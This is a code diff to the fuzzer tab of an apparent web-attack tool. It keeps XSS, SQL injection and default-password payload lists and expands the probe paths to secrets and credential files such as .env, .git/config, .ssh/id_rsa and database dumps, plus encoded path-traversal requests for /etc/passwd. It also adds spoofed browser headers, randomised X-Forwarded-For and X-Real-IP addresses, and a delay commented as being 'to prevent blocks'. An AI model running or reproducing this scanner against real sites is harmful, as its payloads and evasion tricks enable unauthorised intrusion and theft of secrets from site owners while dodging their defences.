@@ -4,7 +4,25 @@ import { sendRequest, validateHost } from "../lib/api.js";
 import { Panel, Btn, Tag, Inp } from "../components/ui.jsx";
 
 const PRESETS = {
-  paths: ["/admin", "/login", "/api", "/.env", "/.git", "/wp-admin", "/backup", "/.env", "/upload", "/dashboard", "/users", "/panel", "/secret", "/test", "/debug", "/status", "/health", "/.git/config", "/phpinfo.php", "/xmlrpc.php"],
+  paths: [
+    "/.env", "/.env.local", "/.env.example", "/.env.dev", "/.env.prod", "/.env.backup",
+    "/.git/config", "/.git/HEAD", "/.gitignore", "/.htaccess", "/.htpasswd",
+    "/.svn/entries", "/.hg/hgrc",
+    "/Dockerfile", "/docker-compose.yml", "/.dockerignore", "/.railway", "/railway.json",
+    "/health", "/metrics", "/status", "/healthcheck", "/actuator/health", "/actuator/env",
+    "/%2e/admin", "//admin", "/admin", "/login", "/api", "/wp-admin", "/administrator",
+    "/backup", "/upload", "/dashboard", "/users", "/panel", "/secret", "/test", "/debug",
+    "/phpinfo.php", "/xmlrpc.php", "/server-status", "/server-info",
+    "/package.json", "/package-lock.json", "/yarn.lock", "/pnpm-lock.yaml",
+    "/server.js", "/index.js", "/app.js", "/config.json", "/config.yml", "/settings.json",
+    "/..%2f..%2f..%2fetc/passwd", "/..%2f..%2f..%2fwindows/win.ini",
+    "/error.log", "/access.log", "/debug.log", "/app.log", "/server.log",
+    "/backup.zip", "/backup.tar.gz", "/backup.sql", "/dump.sql", "/db.sql", "/db.sqlite", "/db.sqlite3",
+    "/robots.txt", "/sitemap.xml", "/crossdomain.xml", "/clientaccesspolicy.xml",
+    "/.well-known/security.txt", "/swagger.json", "/swagger-ui.html", "/api-docs", "/graphql", "/graphiql",
+    "/wp-config.php", "/wp-content/debug.log", "/.vscode/settings.json", "/.idea/workspace.xml",
+    "/.DS_Store", "/Thumbs.db", "/web.config", "/.bash_history", "/.ssh/id_rsa"
+  ],
   xss: ["<script>alert(1)</script>", '"><img src=x onerror=alert(1)>', "javascript:alert(1)", "'><svg onload=alert(1)>", "<iframe src=javascript:alert(1)>", "<body onload=alert(1)>", "<img src=x onerror=alert('xss')>"],
   sqli: ["'", "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1", "1; DROP TABLE users--", "1 UNION SELECT null--", "' AND SLEEP(5)--", "admin'--", "1' OR '1'='1"],
   passwords: ["password", "123456", "admin", "letmein", "welcome", "qwerty", "pass123", "admin123", "root", "toor", "password1", "monkey"],
@@ -58,7 +76,18 @@ export default function FuzzerTab({ proxyOnline }) {
 
       const t = Date.now();
       try {
-        const r = await sendRequest({ url: testUrl, method: "GET", headers: {} });
+        const rnd = () => Math.floor(Math.random() * 255);
+        const randomIp = `${rnd() + 1}.${rnd()}.${rnd()}.${rnd()}`;
+        const headers = {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+          "Sec-Ch-Ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
+          "Sec-Ch-Ua-Mobile": "?0",
+          "Sec-Ch-Ua-Platform": '"Windows"',
+          "X-Forwarded-For": randomIp,
+          "X-Real-IP": randomIp
+        };
+
+        const r = await sendRequest({ url: testUrl, method: "GET", headers });
         const elapsed = Date.now() - t;
         setResults(prev => [...prev, {
           id: crypto.randomUUID(),
@@ -73,7 +102,8 @@ export default function FuzzerTab({ proxyOnline }) {
       } catch {
         setResults(prev => [...prev, { id: crypto.randomUUID(), payload, url: testUrl, status: "ERR", length: 0, time: 0, body: "", headers: {} }]);
       }
-      await new Promise(r => setTimeout(r, proxyOnline ? 150 : 800));
+      // Fixed 1000ms delay to prevent blocks
+      await new Promise(r => setTimeout(r, 1000));
     }
     setRunning(false);
   };
